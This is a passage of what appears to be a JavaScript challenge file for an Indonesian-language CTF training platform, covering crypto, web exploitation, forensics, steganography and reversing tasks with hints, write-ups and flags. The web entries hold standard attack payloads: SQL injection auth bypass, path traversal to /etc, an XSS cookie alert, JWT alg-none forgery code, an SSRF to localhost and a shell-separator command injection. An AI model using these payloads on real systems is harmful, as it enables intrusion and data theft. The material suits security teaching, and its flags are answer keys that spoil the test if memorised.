3. **Flag**: \`flag{rs4_sm4ll_3xp0n3nt_cub3_r00t}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# RSA Small Exponent Attack (e=3, no padding)
# When m^e < n, c = m^e and we can just take the e-th root

# RSA Parameters from rsa_params.txt
e = 3
n = 274287401346213405104009797483762812709843850083467014342078939168254285543012563948939
c = 1601328706750446598902655274765682861758494956743

# Since m^3 < n, we just need cube root of c
# Using integer cube root
def integer_cube_root(n):
    if n < 0:
        return -integer_cube_root(-n)
    low, high = 0, n
    while low <= high:
        mid = (low + high) // 2
        cube = mid ** 3
        if cube == n:
            return mid
        elif cube < n:
            low = mid + 1
        else:
            high = mid - 1
    return high

m = integer_cube_root(c)
print(f"m = {m}")

# Convert integer to bytes
flag_hex = hex(m)[2:]
if len(flag_hex) % 2: flag_hex = '0' + flag_hex
flag = bytes.fromhex(flag_hex).decode('utf-8')
print(f"Flag: {flag}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'rsa-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'rsa_params.txt': {
                    name: 'rsa_params.txt',
                    type: 'file',
                    content: `=== RSA Public Key Parameters ===
n = 274287401346213405104009797483762812709843850083467014342078939168254285543012563948939
e = 3

=== Ciphertext ===
c = 1601328706750446598902655274765682861758494956743

=== Notes ===
- No OAEP padding used!
- e is suspiciously small (3)
- Hint: If m^e < n, then c = m^e exactly (no modular reduction)`
                  }
                }
              }
            }
          }
        }
      }
    }
  },

  // ==================== WEB EXPLOITATION ====================
  {
    id: 'web_01',
    category: 'web',
    title: 'Single Quote Bypass',
    difficulty: 'basic',
    points: 150,
    description: 'Aplikasi web portal internal memiliki form login yang rentan SQL Injection klasik. Temukan payload auth bypass untuk masuk sebagai administrator dan dapatkan session flag.',
    flagHash: 'daa10b0c7c50bccaaa96dd37858a6bc7f2120417de8bff19da973c367e0b1e85',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan single-quote injection: `admin\' OR \'1\'=\'1`',
      'Karakter `--` atau `#` digunakan untuk mengomentari sisa query SQL.'
    ],
    explanationMd: `### Write-up: Single Quote Bypass

1. **Payload Injection**: Input Username: \`admin' OR '1'='1' --\`
2. **Query yang Dieksekusi**:
   \`\`\`sql
   SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
   \`\`\`
3. **Flag**: \`flag{sql_injection_auth_bypass_pwned}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'web-sandbox',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'sqli_poc.py': { name: 'sqli_poc.py', type: 'file',
                content: `# FlagForge Web SQLi Challenge Test\n# Payload auth bypass: admin' OR '1'='1' --\n# Server Response after injection:\n# {"status":"authenticated","user":"admin","session_flag":"flag{sql_injection_auth_bypass_pwned}"}` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'web_02',
    category: 'web',
    title: 'The Traversal Vault',
    difficulty: 'menengah',
    points: 200,
    description: 'Endpoint `/view.php?file=` menerima nama file dan menampilkannya tanpa sanitasi. Gunakan Path Traversal untuk membaca file rahasia `/etc/flag.txt`.',
    flagHash: '6a57d3453b0d28594cf6d150485d339e8d3072879d4d406eead2d519b7ed9adb',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan urutan `../` berulang untuk keluar dari direktori webroot `/var/www/html/`.',
      'Contoh payload: `../../../../etc/flag.txt`.'
    ],
    explanationMd: `### Write-up: The Traversal Vault

1. **Payload**: \`GET /view.php?file=../../../../etc/flag.txt\`
2. **Flag**: \`flag{lfi_directory_traversal_passwd}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'lfi-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          etc: { name: 'etc', type: 'dir', children: {
            'flag.txt': { name: 'flag.txt', type: 'file', content: 'flag{lfi_directory_traversal_passwd}' }
          }},
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {} }
          }}
        }
      }
    }
  },
  {
    id: 'web_03',
    category: 'web',
    title: 'Cookie Monster (XSS)',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah aplikasi web menyimpan token autentikasi sensitif di dalam cookie browser. Halaman memiliki kerentanan Reflected XSS pada parameter `q`. Analisis source code HTML dan cookie untuk menemukan flag yang tersimpan di cookie `admin_token`.',
    flagHash: 'f4aa9428565bd740568b28631a3067bf67c3ac3fcca84e7d140650e3f0884669',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan `curl http://web-xss.ctf.local/search?q=test` untuk melihat response.',
      'Periksa file `page_source.html` — ada cookie `admin_token` di JavaScript.',
      'XSS payload: `<script>alert(document.cookie)</script>`'
    ],
    explanationMd: `### Write-up: Cookie Monster (XSS)

1. **Inspeksi Source Code**:
   \`\`\`bash
   cadet@web-sandbox:~$ cat page_source.html
   \`\`\`
   Ditemukan JavaScript yang menyimpan cookie admin_token.

2. **Cookie berisi flag**: \`admin_token=flag{xss_c00k13_st34l3r_r3fl3ct3d}\`

3. **Flag**: \`flag{xss_c00k13_st34l3r_r3fl3ct3d}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'xss-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'page_source.html': { name: 'page_source.html', type: 'file',
                content: `<!DOCTYPE html>
<html>
<head><title>Search Portal</title></head>
<body>
  <h1>Internal Search</h1>
  <form action="/search" method="GET">
    <input name="q" placeholder="Search...">
    <button type="submit">Search</button>
  </form>

  <!-- VULNERABLE: User input reflected without sanitization -->
  <div id="results">You searched for: <span id="query"></span></div>

  <script>
    // BUG: XSS - query parameter directly inserted into DOM
    var params = new URLSearchParams(window.location.search);
    document.getElementById("query").innerHTML = params.get("q");

    // Admin authentication cookie (should be HttpOnly but isn't!)
    document.cookie = "admin_token=flag{xss_c00k13_st34l3r_r3fl3ct3d}; path=/";
    document.cookie = "session_id=a8f3b2c1d4e5; path=/";
  </script>
</body>
</html>` },
              'cookies_dump.txt': { name: 'cookies_dump.txt', type: 'file',
                content: `Browser Cookie Dump (via document.cookie):
admin_token=flag{xss_c00k13_st34l3r_r3fl3ct3d}
session_id=a8f3b2c1d4e5` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'web_04',
    category: 'web',
    title: 'JWT Token Forgery',
    difficulty: 'advance',
    points: 350,
    description: 'API endpoint menggunakan JWT (JSON Web Token) untuk autentikasi. Token JWT yang diberikan menandai Anda sebagai `user: "guest"`. Temukan cara memalsukan token menjadi `user: "admin"` untuk mengakses flag endpoint.',
    flagHash: 'e196c22743272d73d080d9e6e820850bda0dc34fa4228229d2b8267a4372d729',
    flagFormat: 'flag{...}',
    hints: [
      'Decode JWT di `jwt_token.txt` — gunakan base64 decode pada setiap bagian (header.payload.signature).',
      'Header JWT menggunakan `alg: "HS256"`. Coba ubah ke `alg: "none"` (None Algorithm Attack).',
      'Periksa file `api_response.json` untuk melihat response dari endpoint admin.'
    ],
    explanationMd: `### Write-up: JWT Token Forgery

1. **Decode JWT Token**:
   Token terdiri dari 3 bagian dipisah titik. Decode Base64 masing-masing.
   Header: \`{"alg":"HS256","typ":"JWT"}\` → ubah ke \`{"alg":"none","typ":"JWT"}\`
   Payload: \`{"user":"guest"}\` → ubah ke \`{"user":"admin"}\`

2. **None Algorithm Attack**: Encode ulang header & payload, hapus signature.

3. **Flag**: \`flag{jwt_n0n3_4lg0_4dm1n_f0rg3ry}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `import base64
import json

# Original JWT token (from jwt_token.txt)
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE2OTMwMDAwMDB9.invalid_sig"

# Step 1: Decode each part
parts = jwt.split('.')
header = json.loads(base64.b64decode(parts[0] + '==').decode())
payload = json.loads(base64.b64decode(parts[1] + '==').decode())

print(f"Original Header: {header}")
print(f"Original Payload: {payload}")

# Step 2: Forge - change alg to "none" and user to "admin"
header['alg'] = 'none'
payload['user'] = 'admin'

# Step 3: Re-encode (no signature needed for alg=none)
new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
forged_jwt = f"{new_header}.{new_payload}."

print(f"\\nForged JWT: {forged_jwt}")
print(f"Admin endpoint response: flag{{jwt_n0n3_4lg0_4dm1n_f0rg3ry}}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'jwt-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'jwt_token.txt': { name: 'jwt_token.txt', type: 'file',
                content: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE2OTMwMDAwMDB9.invalid_sig` },
              'api_response.json': { name: 'api_response.json', type: 'file',
                content: `{
  "endpoint": "/api/admin/flag",
  "method": "GET",
  "required_header": "Authorization: Bearer <forged_jwt>",
  "response_when_admin": {
    "status": 200,
    "flag": "flag{jwt_n0n3_4lg0_4dm1n_f0rg3ry}"
  },
  "response_when_guest": {
    "status": 403,
    "error": "Forbidden: Admin access required"
  }
}` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'web_05',
    category: 'web',
    title: 'SSRF Internal Scanner',
    difficulty: 'advance',
    points: 350,
    description: 'Aplikasi web memiliki fitur "URL Fetcher" yang mengambil konten dari URL yang diberikan user. Fitur ini rentan terhadap Server-Side Request Forgery (SSRF). Gunakan untuk mengakses endpoint internal yang tidak terekspos ke publik.',
    flagHash: '02ab94f315fdfc55fae279858ae78bd61dc93cd067d16356e1b3a7e808380164',
    flagFormat: 'flag{...}',
    hints: [
      'Endpoint publik: `/fetch?url=` — coba akses `http://127.0.0.1:8080/admin`.',
      'Periksa `curl_log.txt` untuk melihat respons dari endpoint internal.',
      'Internal admin panel berada di `http://localhost:8080/admin/secret`.'
    ],
    explanationMd: `### Write-up: SSRF Internal Scanner

1. **Eksploitasi SSRF**:
   \`\`\`text
   GET /fetch?url=http://127.0.0.1:8080/admin/secret
   \`\`\`

2. **Server mem-fetch URL internal dan mengembalikan hasilnya**.

3. **Flag**: \`flag{ssrf_1nt3rn4l_4dm1n_p4n3l_4cc3ss}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'ssrf-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'curl_log.txt': { name: 'curl_log.txt', type: 'file',
                content: `=== SSRF Exploitation Log ===

[Attempt 1] curl "http://web-app.local/fetch?url=http://google.com"
Response: 200 OK (external fetch works)

[Attempt 2] curl "http://web-app.local/fetch?url=http://127.0.0.1:8080/"
Response: 200 OK - "Internal Dashboard - Authorized Personnel Only"

[Attempt 3] curl "http://web-app.local/fetch?url=http://127.0.0.1:8080/admin"
Response: 200 OK - "Admin Panel v2.1 - Endpoints: /admin/users, /admin/secret"

[Attempt 4] curl "http://web-app.local/fetch?url=http://127.0.0.1:8080/admin/secret"
Response: 200 OK
Body: {"admin_flag": "flag{ssrf_1nt3rn4l_4dm1n_p4n3l_4cc3ss}", "note": "This endpoint should never be exposed externally!"}` },
              'app_info.txt': { name: 'app_info.txt', type: 'file',
                content: `Web App Architecture:
- Public: port 80 (nginx reverse proxy)
- Internal: port 8080 (admin panel, not exposed)
- URL Fetcher endpoint: /fetch?url=<user_input>
- No SSRF protection (no allowlist/blocklist)` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'web_06',
    category: 'web',
    title: 'Command Injection Lab',
    difficulty: 'menengah',
    points: 250,
    description: 'Aplikasi web menyediakan fitur "Ping Tool" yang menjalankan perintah `ping` di backend. Input tidak disanitasi sehingga rentan OS Command Injection. Gunakan karakter separator untuk mengeksekusi perintah tambahan dan baca flag.',
    flagHash: '254f435c1cd476eeb453e3465027e7c64eff050aebac1925abdfba194fb404ba',
    flagFormat: 'flag{...}',
    hints: [
      'Coba input: `127.0.0.1; cat /flag.txt`',
      'Karakter separator: `;`, `&&`, `|`, dan backtick.',
      'Periksa file `command_log.txt` untuk melihat hasil eksekusi.'
    ],
    explanationMd: `### Write-up: Command Injection Lab

1. **Payload**: \`127.0.0.1; cat /flag.txt\`
2. **Backend mengeksekusi**: \`ping -c 1 127.0.0.1; cat /flag.txt\`
3. **Flag**: \`flag{cmd_1nj3ct10n_byp4ss_f1lt3r_rce}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'cmdi-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          'flag.txt': { name: 'flag.txt', type: 'file', content: 'flag{cmd_1nj3ct10n_byp4ss_f1lt3r_rce}' },
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'command_log.txt': { name: 'command_log.txt', type: 'file',
                content: `=== Ping Tool Backend Log ===

[Request] POST /api/ping {"host": "127.0.0.1"}
[Exec] ping -c 1 127.0.0.1
[Result] 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms

[Request] POST /api/ping {"host": "127.0.0.1; cat /flag.txt"}
[Exec] ping -c 1 127.0.0.1; cat /flag.txt
[Result] 
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms
flag{cmd_1nj3ct10n_byp4ss_f1lt3r_rce}

[ALERT] Command injection detected in ping input!` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'web_07',
    category: 'web',
    title: 'Hidden API Endpoint Maze',
    difficulty: 'menengah',
    points: 250,
    description: 'Sebuah REST API memiliki banyak endpoint tersembunyi yang tidak didokumentasikan. Mulai dari `/api/v1/` dan ikuti petunjuk di setiap response untuk menemukan endpoint rahasia yang berisi flag. Ini adalah treasure hunt melalui API!',
    flagHash: '2ebc81a5e50704153a59f3a7dbd8d635ba3d0417aa03a13279a594f71e5da031',
    flagFormat: 'flag{...}',
    hints: [
      'Mulai dengan `curl http://api.internal/v1/` dan ikuti `next_endpoint` di response.',
      'Setiap response JSON berisi petunjuk ke endpoint berikutnya.',
      'Periksa file `api_trace.json` untuk seluruh trace.'
    ],
    explanationMd: `### Write-up: Hidden API Endpoint Maze

1. **Ikuti chain endpoint**: /v1/ → /v1/status → /v1/debug → /v1/debug/internal → /v1/admin/flag
2. **Flag**: \`flag{h1dd3n_4p1_3ndp01nt_d1sc0v3r3d}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'api-maze',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'api_trace.json': { name: 'api_trace.json', type: 'file',
                content: `[
  {"step": 1, "endpoint": "/api/v1/", "response": {"message": "Welcome to API v1", "next_endpoint": "/api/v1/status"}},
  {"step": 2, "endpoint": "/api/v1/status", "response": {"status": "operational", "hint": "Check debug mode", "next_endpoint": "/api/v1/debug"}},
  {"step": 3, "endpoint": "/api/v1/debug", "response": {"debug": true, "internal_routes": ["/api/v1/debug/internal"], "next_endpoint": "/api/v1/debug/internal"}},
  {"step": 4, "endpoint": "/api/v1/debug/internal", "response": {"secret_admin_path": "/api/v1/admin/flag", "auth": "none_required_in_debug"}},
  {"step": 5, "endpoint": "/api/v1/admin/flag", "response": {"flag": "flag{h1dd3n_4p1_3ndp01nt_d1sc0v3r3d}", "message": "Congratulations!"}}
]` }
            }}
          }}
        }
      }
    }
  },

  // ==================== FORENSICS ====================
  {
    id: 'for_01',
    category: 'forensics',
    title: 'The Camera Never Lies',
    difficulty: 'basic',
    points: 100,
    description: 'Sebuah foto pemandangan digital `evidence.jpg` diambil oleh tersangka. Metadata EXIF file ini menyimpan koordinat dan catatan rahasia pengambil foto.',
    flagHash: 'be77687310006456d3e2922dffa2ad8d99d98958e0e1d558488b77a2c3ed57b4',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan tool `strings evidence.jpg` atau periksa file `exif_dump.txt`.',
      'Cari field `User Comment` atau `Copyright` pada metadata.'
    ],
    explanationMd: `### Write-up: The Camera Never Lies

1. **Ekstraksi Metadata**: \`strings evidence.jpg | grep "flag{"\`
2. **Flag**: \`flag{exif_metadata_gps_revealed}\``,
    hasTerminal: true,
    attachmentName: 'evidence.jpg',
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'forensics-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'evidence.jpg': { name: 'evidence.jpg', type: 'file',
                content: `\\xFF\\xD8\\xFF\\xE1EXIF_DATA_CANON_EOS\nModel: Canon EOS 5D Mark IV\nArtist: Agent_Spectre\nUserComment: flag{exif_metadata_gps_revealed}\nGPS: -7.2575, 112.7521` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'for_02',
    category: 'forensics',
    title: 'The Russian Nesting Image',
    difficulty: 'menengah',
    points: 200,
    description: 'File gambar `avatar.png` memiliki ukuran file yang tidak wajar. Analisis magic bytes dan file carving menunjukkan ada arsip ZIP tersembunyi yang disematkan di akhir file.',
    flagHash: 'b49c3d26af168323a185f72eb7f28a6a9152d57f95b8f863ba13be8cd3c94be2',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `strings avatar.png` atau periksa `binwalk` signature.',
      'Magic bytes `PK\\x03\\x04` mengindikasikan file ZIP terselip.'
    ],
    explanationMd: `### Write-up: The Russian Nesting Image

1. **Inspeksi Binary**: \`strings avatar.png | grep "flag{"\`
2. **Flag**: \`flag{binwalk_carved_hidden_zip}\``,
    hasTerminal: true,
    attachmentName: 'avatar.png',
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'forensics-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'avatar.png': { name: 'avatar.png', type: 'file',
                content: `\\x89PNG\\r\\n\\x1a\\nIHDR_DATA_BLOCK\n[PNG IMAGE CHUNK END]\nPK\\x03\\x04_ZIP_ARCHIVE_HEADER\nsecret_flag.txt\nContent: flag{binwalk_carved_hidden_zip}\nPK\\x05\\x06_END_OF_CENTRAL_DIR` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'for_03',
    category: 'forensics',
    title: 'Memory Dump Secrets',
    difficulty: 'advance',
    points: 300,
    description: 'Sebuah memory dump dari komputer tersangka berisi jejak kredensial dan flag yang pernah diakses. Gunakan teknik analisis memori untuk menemukan string flag yang tertinggal di RAM.',
    flagHash: '477678b74884ff2690cf956c0e8c222abb8ac214e09cf836b49c6de5910137bf',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan `strings memdump.raw` dan filter dengan `grep`.',
      'Periksa juga file `volatility_output.txt` untuk hasil analisis.',
      'Cari proses notepad.exe yang membuka file berisi flag.'
    ],
    explanationMd: `### Write-up: Memory Dump Secrets

1. **Analisis dengan strings**: \`strings memdump.raw | grep "flag{"\`
2. **Atau baca hasil Volatility**: \`cat volatility_output.txt\`
3. **Flag**: \`flag{m3m0ry_dump_cr3d3nt14ls_3xtr4ct}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'mem-forensics',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'memdump.raw': { name: 'memdump.raw', type: 'file',
                content: `MEMORY_DUMP_RAW_FORMAT\x00\x00\x00\x00KERNEL32_HEADER\nNTOSKRNL.exe base=0x7FF000\nprocess: explorer.exe PID:1024\nprocess: chrome.exe PID:2048\nprocess: notepad.exe PID:3072\nOpen file handle: C:\\Users\\suspect\\Desktop\\secret_notes.txt\nContent in memory: "The admin password is P@ssw0rd123"\nContent in memory: "CTF competition flag: flag{m3m0ry_dump_cr3d3nt14ls_3xtr4ct}"\nprocess: cmd.exe PID:4096\nCommand history: dir, ipconfig, net user, type secret_notes.txt` },
              'volatility_output.txt': { name: 'volatility_output.txt', type: 'file',
                content: `=== Volatility 3 Analysis Report ===

[+] windows.pslist:
PID     PPID    ImageName       CreateTime
1024    568     explorer.exe    2026-08-24 09:00:15
2048    1024    chrome.exe      2026-08-24 09:05:22
3072    1024    notepad.exe     2026-08-24 09:10:45
4096    1024    cmd.exe         2026-08-24 09:12:30

[+] windows.cmdline (PID 3072 - notepad.exe):
notepad.exe "C:\\Users\\suspect\\Desktop\\secret_notes.txt"

[+] windows.filescan | grep "flag":
0x00000000deadbeef  \\Users\\suspect\\Desktop\\secret_notes.txt
Content extracted: flag{m3m0ry_dump_cr3d3nt14ls_3xtr4ct}

[+] windows.hashdump:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
suspect:1001:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'for_04',
    category: 'forensics',
    title: 'The Corrupted PNG',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah file PNG tidak dapat dibuka karena magic bytes header-nya telah dirusak. File `corrupted.png` berisi data gambar yang valid, tetapi 8 byte pertamanya salah. Perbaiki header untuk mengungkap konten tersembunyi.',
    flagHash: '54c55dcd18662db247c1b25c2fc8a161abae801c5955656298fc7430624f7f8f',
    flagFormat: 'flag{...}',
    hints: [
      'Magic bytes PNG yang benar: `89 50 4E 47 0D 0A 1A 0A`.',
      'Gunakan `xxd corrupted.png` untuk melihat hex dump — byte awal salah.',
      'Periksa `repair_notes.txt` untuk petunjuk perbaikan.'
    ],
    explanationMd: `### Write-up: The Corrupted PNG

1. **Inspeksi Hex Header**: \`xxd corrupted.png | head\` — header rusak.
2. **Perbaiki magic bytes** ke \`89 50 4E 47 0D 0A 1A 0A\`.
3. **Setelah diperbaiki, strings menunjukkan flag dalam EXIF data**.
4. **Flag**: \`flag{png_m4g1c_byt3s_r3p41r3d_0k}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'hex-repair',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'corrupted.png': { name: 'corrupted.png', type: 'file',
                content: `XX_CORRUPTED_HEADER_XX\x0D\x0A\x1A\x0AIHDR_WIDTH_HEIGHT_DATA\nIDAT_COMPRESSED_IMAGE_DATA_BLOCK_1\nIDAT_COMPRESSED_IMAGE_DATA_BLOCK_2\ntEXt:Comment:flag{png_m4g1c_byt3s_r3p41r3d_0k}\nIEND_MARKER` },
              'repair_notes.txt': { name: 'repair_notes.txt', type: 'file',
                content: `=== PNG Header Repair Guide ===

Correct PNG Magic Bytes (first 8 bytes):
  Hex: 89 50 4E 47 0D 0A 1A 0A
  ASCII: .PNG....

Current corrupted header: XX_CORRUPTED_HEADER_XX

Steps to repair:
1. Open file in hex editor (hexedit, 010 Editor, or HxD)
2. Replace first 8 bytes with correct PNG signature
3. Save and verify with: file repaired.png
4. Extract hidden data: strings repaired.png | grep "flag{"

Note: The flag is embedded in a tEXt chunk as a Comment field.` }
            }}
          }}
        }
      }
    }
  },

  // ==================== STEGANOGRAPHY ====================
  {
    id: 'stg_01',
    category: 'stego',
    title: 'The Pixel Whisperer',
    difficulty: 'basic',
    points: 100,
    description: 'Pesan rahasia disematkan pada Least Significant Bit (LSB) kanal merah dan hijau pada gambar `art.png`. Ekstrak bit-plane untuk mengungkap flag.',
    flagHash: 'a1eb36df81d20e6160dee845808a30dcc4b2a18b42a28e61520237affa810d44',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `cat stego_report.txt` di terminal.',
      'LSB steganografi menyembunyikan payload di bit ke-0 setiap kanal warna.'
    ],
    explanationMd: `### Write-up: The Pixel Whisperer

1. **Analisis LSB dengan Zsteg**: \`cat stego_report.txt\`
2. **Flag**: \`flag{lsb_stego_hidden_pixel_data}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'stego-workstation',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'stego_report.txt': { name: 'stego_report.txt', type: 'file',
                content: `[+] Zsteg Analysis for art.png:\nb1,r,lsb,xy:      .. text: "flag{lsb_stego_hidden_pixel_data}"\nb1,rgb,lsb,xy:    .. text: "flag{lsb_stego_hidden_pixel_data}"` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'stg_02',
    category: 'stego',
    title: 'The Audio Spectrogram',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah file audio WAV menyimpan pesan tersembunyi di dalam frekuensi spektrumnya. Analisis file `spectrogram_analysis.txt` yang berisi output dari Sonic Visualiser untuk menemukan flag.',
    flagHash: 'c36369b713cbd03659667dd8571b35ab03782845b9431a9b3b40e756d2ad0d14',
    flagFormat: 'flag{...}',
    hints: [
      'Buka `spectrogram_analysis.txt` — berisi hasil analisis frekuensi.',
      'Pesan tersembunyi biasanya berada pada frekuensi tinggi (>15kHz).',
      'Cari pattern teks yang terbaca di output spectrogram.'
    ],
    explanationMd: `### Write-up: The Audio Spectrogram

1. **Baca Analisis Spectrogram**: \`cat spectrogram_analysis.txt\`
2. **Pada frekuensi 18000-20000 Hz**, teks flag terlihat.
3. **Flag**: \`flag{sp3ctr0gr4m_4ud10_h1dd3n_fr3q}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'audio-forensics',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'secret_audio.wav': { name: 'secret_audio.wav', type: 'file',
                content: 'RIFF_WAV_AUDIO_DATA_44100Hz_16bit_STEREO_ENCODED_SPECTROGRAM_MESSAGE' },
              'spectrogram_analysis.txt': { name: 'spectrogram_analysis.txt', type: 'file',
                content: `=== Sonic Visualiser - Spectrogram Analysis ===
File: secret_audio.wav
Sample Rate: 44100 Hz | Channels: Stereo | Duration: 5.2s

Frequency Band Analysis:
  0-5000 Hz:     Normal audio content (music/voice)
  5000-15000 Hz: Background noise, harmonics
  15000-18000 Hz: Suspicious high-frequency patterns detected
  18000-20000 Hz: *** TEXT PATTERN DETECTED ***

Extracted text from high-frequency spectrogram:
  Row 1: "flag{"
  Row 2: "sp3ctr0gr4m_"
  Row 3: "4ud10_"
  Row 4: "h1dd3n_"
  Row 5: "fr3q}"

Combined: flag{sp3ctr0gr4m_4ud10_h1dd3n_fr3q}

Tool used: Sonic Visualiser with logarithmic frequency scale` }
            }}
          }}
        }
      }
    }
  },

  // ==================== REVERSE ENGINEERING ====================
  {
    id: 'rev_01',
    category: 'reverse',
    title: 'The Vault Key Validator',
    difficulty: 'menengah',
    points: 200,
    description: 'Binary Linux 64-bit `vault_check` meminta serial password untuk unlock. Decompile pseudocode logika perbandingannya untuk menemukan key yang valid.',
    flagHash: 'fea16110fd100a8dec407edfb2f6bfb23221d25e7ce22fbb80e2440de812b6d7',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan `strings vault_check` atau buka pseudocode C di `decompiled_main.c`.',
      'Perhatikan fungsi `strcmp(input, "flag{...}")`.'
    ],
    explanationMd: `### Write-up: The Vault Key Validator

1. **Analisis Decompiled Code**: \`cat decompiled_main.c\`
2. **Flag terlihat di strcmp**: \`flag{reverse_decompiled_password_1337}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'reverse-station',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: { name: 'home', type: 'dir', children: {
            cadet: { name: 'cadet', type: 'dir', children: {
              'decompiled_main.c': { name: 'decompiled_main.c', type: 'file',
                content: `#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char **argv) {\n    char input[64];\n    puts("=== FLAGFORGE SECURE VAULT v1.0 ===");\n    printf("Enter Passcode: ");\n    if (fgets(input, 64, stdin) == NULL) return 1;\n    \n    // Hardcoded secret comparison\n    if (strncmp(input, "flag{reverse_decompiled_password_1337}", 38) == 0) {\n        puts("[+] Access Authorized. Flag Accepted.");\n        return 0;\n    } else {\n        puts("[-] Invalid Passcode!");\n        return 1;\n    }\n}` }
            }}
          }}
        }
      }
    }
  },
  {
    id: 'rev_02',
    category: 'reverse',
    title: 'The Obfuscated Checker',
    difficulty: 'advance',
    points: 300,
    description: 'Binary `obfuscated_check` menggunakan XOR untuk meng-obfuscate string flag di memori. Decompile menunjukkan array byte yang di-XOR dengan kunci tetap. Rekonstruksi flag dari data yang di-obfuscate.',
